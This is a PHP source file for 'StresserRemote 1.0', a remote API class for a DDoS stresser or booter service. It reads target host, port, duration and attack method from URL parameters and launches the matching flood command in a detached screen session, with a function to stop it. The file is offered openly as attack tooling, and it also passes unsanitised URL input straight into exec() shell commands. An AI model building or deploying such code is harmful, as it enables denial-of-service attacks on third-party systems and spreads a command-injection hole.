<?php
/**
 *  StresserRemote 1.0 - The Best Way To Use Remote API Of Stressers
 *
 *  @author Alemalakra
 *  @version 1.0
 */

class StresserRemote {
	function checkDependencies() {
		if (function_exists('exec')) {
			$Check = exec('which screen');
			if ($Check == "") {
				die('Screen Is No Installed, Please, If You Use Centos: yum install screen If You Use Linux/Ubuntu: apt-get install screen');
			} else {
				return true;
			}
		} else {
			die('Please, Install exec() Function To Use This API');
		}
	}
	function getVariables() {
		if (isset($_GET['key'])) {
			if (isset($_GET['host'])) {
				if (isset($_GET['port'])) {
					if (isset($_GET['time'])) {
						if (isset($_GET['method'])) {
							return true;
						} else {
							die('Please, Check You URL And Try Another Time');
						}
					} else {
						die('Please, Check You URL And Try Another Time');
					}
				} else {
					die('Please, Check You URL And Try Another Time');
				}
			} else {
				die('Please, Check You URL And Try Another Time');
			}
		} else {
			die('Please, Check You URL And Try Another Time');
		}
	}
	function stop($IP) {
		$Name = str_replace('.', '_', $IP);
		$_cmd = exec('screen -X -S ' . $Name . ' quit');
		die('Attack Stopped To ' . $IP);	
	}
	function attack($IP, $Port, $Time, $Method, $Methods) {
		$_cmd = $Methods[$Method]['Command'];
		$Name = str_replace('.', '_', $IP);
       		$arrayFind    = array('[host]', '[port]', '[time]', '[method]');
        	$arrayReplace    = array($IP, $Port, $Time, $Method);
        	$_cmd = str_replace($arrayFind, $arrayReplace, $_cmd);
		exec('cd ' . $Methods[$Method]['Directory'] . ' && ' . 'screen -dmS ' . $Name . ' ' . $_cmd);
		die('Attacking ' . $IP . ' With Method ' . $Method . ' For Time' . $Time);
	}
}

?>
